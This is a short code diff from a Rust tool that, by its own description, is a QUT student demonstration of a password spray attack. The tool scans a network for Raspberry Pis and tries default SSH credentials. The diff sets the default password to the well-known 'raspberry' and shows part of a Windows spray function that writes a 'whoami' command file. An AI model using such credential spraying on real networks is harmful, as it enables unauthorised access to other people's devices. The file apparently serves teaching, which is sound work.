@@ -4,7 +4,7 @@ use colored::*;
 use std::io::Write;
 
 static DEFAULT_USERNAME: &str = "pi";
-static DEFAULT_PASSWORD: &str = "186068";
+static DEFAULT_PASSWORD: &str = "raspberry";
 
 #[derive(Parser)]
 ///Search a network for raspberry PI's and try default credentials with an ssh connection. This is a QUT student demonstration of a password spray attack. 
@@ -115,7 +115,7 @@ fn spray(ips: Vec<String>) {
 
 #[cfg(target_os = "windows")]
 fn spray(ips: Vec<String>) {
-    
+
     let mut file = std::fs::File::create("whoami.txt").expect("Failed to file for splink");
     file.write_all("whoami".as_bytes()).expect("Failed to write to file for splink");
 
